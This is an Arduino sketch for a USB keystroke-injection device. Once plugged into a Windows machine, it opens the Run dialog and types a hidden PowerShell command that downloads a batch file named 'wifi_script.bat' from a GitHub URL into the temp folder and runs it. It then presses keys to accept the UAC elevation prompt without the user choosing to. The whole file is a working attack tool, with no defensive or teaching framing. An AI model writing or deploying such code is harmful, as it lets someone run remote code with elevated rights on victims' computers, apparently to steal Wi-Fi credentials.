#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  
  // Open Run dialog (Win+R) - Super fast
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  // Type complete PowerShell command - instant execution
  typeString("powershell -w hidden iwr -useb 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/wifi_script.bat' -OutFile $env:TEMP\\f.bat;start $env:TEMP\\f.bat");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  
  // // Wait for UAC prompt and press Left arrow + Enter (to select "Yes")
  delay(4000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  
  Keyboard.end();
}

// minimal delay
void typeString(const char* str) {
  while (*str) {
    Keyboard.write(*str);
    delay(5);
    str++;
  }
}

void loop() {
  // Nothing to do here
}